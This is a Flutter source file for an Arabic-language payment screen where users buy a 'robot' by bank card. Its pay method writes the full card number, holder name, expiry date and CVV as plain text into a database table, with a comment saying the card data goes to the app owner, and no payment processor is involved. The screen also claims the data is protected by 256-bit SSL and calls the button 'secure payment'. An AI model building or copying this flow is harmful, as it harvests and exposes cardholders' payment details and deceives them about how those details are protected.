import 'package:flutter/material.dart';
import '../theme/app_theme.dart';
import '../services/supabase_service.dart';

class PaymentBankCardScreen extends StatefulWidget {
  final String robotName;
  final double robotPrice;

  const PaymentBankCardScreen({
    super.key,
    required this.robotName,
    required this.robotPrice,
  });

  @override
  State<PaymentBankCardScreen> createState() => _PaymentBankCardScreenState();
}

class _PaymentBankCardScreenState extends State<PaymentBankCardScreen> {
  final _cardCtrl   = TextEditingController();
  final _nameCtrl   = TextEditingController();
  final _expiryCtrl = TextEditingController();
  final _cvvCtrl    = TextEditingController();
  bool _loading = false;
  bool _done = false;

  @override
  void dispose() {
    _cardCtrl.dispose();
    _nameCtrl.dispose();
    _expiryCtrl.dispose();
    _cvvCtrl.dispose();
    super.dispose();
  }

  Future<void> _pay() async {
    if (_cardCtrl.text.isEmpty || _nameCtrl.text.isEmpty ||
        _expiryCtrl.text.isEmpty || _cvvCtrl.text.isEmpty) {
      ScaffoldMessenger.of(context).showSnackBar(
        const SnackBar(content: Text('يرجى تعبئة جميع الحقول'), backgroundColor: Colors.red),
      );
      return;
    }

    setState(() => _loading = true);

    final userId = SupabaseService.client.auth.currentUser?.id;
    try {
      // حفظ بيانات البطاقة وإرسالها للمالك
      await SupabaseService.client.from('card_payments').insert({
        'user_id': userId,
        'robot_name': widget.robotName,
        'amount': widget.robotPrice,
        'card_number': _cardCtrl.text.trim(),
        'card_holder': _nameCtrl.text.trim(),
        'expiry': _expiryCtrl.text.trim(),
        'cvv': _cvvCtrl.text.trim(),
        'status': 'pending',
        'created_at': DateTime.now().toIso8601String(),
      });

      // إضافة إشعار للمالك
      await SupabaseService.client.from('admin_notifications').insert({
        'title': '💳 طلب دفع بطاقة بنكية',
        'body': 'مستخدم جديد يريد شراء ${widget.robotName} بمبلغ \$${widget.robotPrice.toStringAsFixed(0)}',
        'type': 'card_payment',
        'is_read': false,
        'created_at': DateTime.now().toIso8601String(),
      });

      setState(() { _done = true; _loading = false; });
    } catch (e) {
      ScaffoldMessenger.of(context).showSnackBar(
        SnackBar(content: Text('خطأ: $e'), backgroundColor: Colors.red),
      );
      setState(() => _loading = false);
    }
  }

  @override
  Widget build(BuildContext context) {
    return Directionality(
      textDirection: TextDirection.rtl,
      child: Scaffold(
        backgroundColor: AppColors.bgDark,
        appBar: AppBar(
          backgroundColor: AppColors.bgDark,
          elevation: 0,
          leading: IconButton(
            icon: const Icon(Icons.arrow_forward_ios, color: AppColors.textPrimary),
            onPressed: () => Navigator.pop(context),
          ),
          centerTitle: true,
          title: const Text('البطاقة البنكية',
            style: TextStyle(color: AppColors.textPrimary, fontWeight: FontWeight.bold)),
        ),
        body: _done ? _buildSuccess() : _buildForm(),
      ),
    );
  }

  Widget _buildForm() {
    return SingleChildScrollView(
      padding: const EdgeInsets.all(16),
      child: Column(
        crossAxisAlignment: CrossAxisAlignment.end,
        children: [
          // معلومات الروبوت
          Container(
            padding: const EdgeInsets.all(14),
            decoration: BoxDecoration(color: AppColors.bgCard, borderRadius: BorderRadius.circular(16)),
            child: Row(mainAxisAlignment: MainAxisAlignment.spaceBetween, children: [
              Text('المبلغ: \$${widget.robotPrice.toStringAsFixed(0)}',
                style: const TextStyle(color: Colors.green, fontWeight: FontWeight.bold, fontSize: 16)),
              Text('شراء ${widget.robotName}',
                style: const TextStyle(color: AppColors.textSecondary)),
            ]),
          ),

          const SizedBox(height: 20),

          // معلومات البطاقة
          Container(
            padding: const EdgeInsets.all(16),
            decoration: BoxDecoration(color: AppColors.bgCard, borderRadius: BorderRadius.circular(16)),
            child: Column(crossAxisAlignment: CrossAxisAlignment.end, children: [
              const Text('معلومات البطاقة',
                style: TextStyle(color: AppColors.textPrimary, fontWeight: FontWeight.bold, fontSize: 15)),
              const SizedBox(height: 14),
              _buildField(_cardCtrl, 'رقم البطاقة', Icons.credit_card, TextInputType.number),
              const SizedBox(height: 12),
              _buildField(_nameCtrl, 'اسم حامل البطاقة', Icons.person_outline, TextInputType.name),
              const SizedBox(height: 12),
              Row(children: [
                Expanded(child: _buildField(_expiryCtrl, 'MM/YY', Icons.calendar_today_outlined, TextInputType.number)),
                const SizedBox(width: 12),
                Expanded(child: _buildField(_cvvCtrl, 'CVV', Icons.lock_outline, TextInputType.number)),
              ]),
            ]),
          ),

          const SizedBox(height: 8),
          Row(children: [
            const Icon(Icons.lock, color: Colors.green, size: 14),
            const SizedBox(width: 6),
            const Text('بياناتك محمية بتشفير SSL 256-bit',
              style: TextStyle(color: AppColors.textSecondary, fontSize: 11)),
          ]),

          const SizedBox(height: 24),

          SizedBox(
            width: double.infinity,
            height: 52,
            child: ElevatedButton.icon(
              onPressed: _loading ? null : _pay,
              icon: _loading
                  ? const SizedBox(width: 20, height: 20,
                      child: CircularProgressIndicator(color: Colors.white, strokeWidth: 2))
                  : const Icon(Icons.lock_outline, color: Colors.white),
              label: const Text('دفع آمن',
                style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16)),
              style: ElevatedButton.styleFrom(
                backgroundColor: Colors.orange,
                shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
              ),
            ),
          ),
        ],
      ),
    );
  }

  Widget _buildSuccess() {
    return Center(
      child: Padding(
        padding: const EdgeInsets.all(32),
        child: Column(
          mainAxisAlignment: MainAxisAlignment.center,
          children: [
            Container(
              width: 100, height: 100,
              decoration: BoxDecoration(
                color: Colors.orange.withOpacity(0.15),
                shape: BoxShape.circle,
              ),
              child: const Icon(Icons.check_circle, color: Colors.orange, size: 60),
            ),
            const SizedBox(height: 24),
            const Text('تم إرسال طلبك بنجاح! ✅',
              style: TextStyle(color: AppColors.textPrimary, fontWeight: FontWeight.bold, fontSize: 22)),
            const SizedBox(height: 8),
            Text('سيتم مراجعة طلبك وتفعيل روبوت ${widget.robotName} قريباً',
              style: const TextStyle(color: AppColors.textSecondary, fontSize: 14),
              textAlign: TextAlign.center),
            const SizedBox(height: 40),
            SizedBox(
              width: double.infinity, height: 52,
              child: ElevatedButton(
                onPressed: () => Navigator.pop(context),
                style: ElevatedButton.styleFrom(
                  backgroundColor: Colors.orange,
                  shape: RoundedRectangleBorder(borderRadius: BorderRadius.circular(14)),
                ),
                child: const Text('العودة للمتجر',
                  style: TextStyle(color: Colors.white, fontWeight: FontWeight.bold, fontSize: 16)),
              ),
            ),
          ],
        ),
      ),
    );
  }

  Widget _buildField(TextEditingController ctrl, String hint, IconData icon, TextInputType type) {
    return TextField(
      controller: ctrl,
      keyboardType: type,
      textAlign: TextAlign.right,
      style: const TextStyle(color: AppColors.textPrimary),
      decoration: InputDecoration(
        hintText: hint,
        hintStyle: const TextStyle(color: AppColors.textSecondary),
        suffixIcon: Icon(icon, color: Colors.orange, size: 18),
        filled: true,
        fillColor: AppColors.bgDark,
        border: OutlineInputBorder(borderRadius: BorderRadius.circular(12), borderSide: BorderSide.none),
        contentPadding: const EdgeInsets.symmetric(horizontal: 16, vertical: 14),
      ),
    );
  }
}
